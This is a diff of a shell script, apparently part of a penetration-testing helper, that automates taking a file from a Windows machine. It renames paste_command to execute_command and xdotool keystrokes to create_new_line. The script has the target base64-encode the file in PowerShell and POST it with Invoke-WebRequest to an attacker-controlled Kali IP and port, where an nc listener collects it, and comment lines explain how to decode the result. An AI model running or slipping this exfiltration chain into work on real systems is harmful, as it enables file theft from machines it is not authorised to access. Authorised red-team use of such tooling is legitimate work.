@@ -15,21 +15,21 @@ FILE=${form_data["file"]}
 HTTP_PORT=${form_data["Http port"]}
 BASE_FILE_NAME= $(basename $FILE)
 
-paste_command "\$Base64String = [System.convert]::ToBase64String((Get-Content -Path '${FILE}' -Encoding Byte))"
-xdotool key Return
+execute_command "\$Base64String = [System.convert]::ToBase64String((Get-Content -Path '${FILE}' -Encoding Byte))"
+create_new_line
 sleep 2
 
-paste_command "# Be sure nc -lvnp ${HTTP_PORT} is running"
-xdotool key Return
+execute_command "# Be sure nc -lvnp ${HTTP_PORT} is running"
+create_new_line
 sleep 3
 
-paste_command "Invoke-WebRequest -Uri http://${KALI_IP}:${HTTP_PORT} -Method POST -Body $Base64String"
-xdotool key Return
+execute_command "Invoke-WebRequest -Uri http://${KALI_IP}:${HTTP_PORT} -Method POST -Body $Base64String"
+create_new_line
 sleep 1
 
-paste_command "# check the port listening terminal and execute the following to save the file"
-xdotool key Return
+execute_command "# check the port listening terminal and execute the following to save the file"
+create_new_line
 sleep 1
 
-paste_command "# echo <base64 encoded file> | base64 -d -w 0 > ${BASE_FILE_NAME}"
-xdotool key Return
+execute_command "# echo <base64 encoded file> | base64 -d -w 0 > ${BASE_FILE_NAME}"
+create_new_line
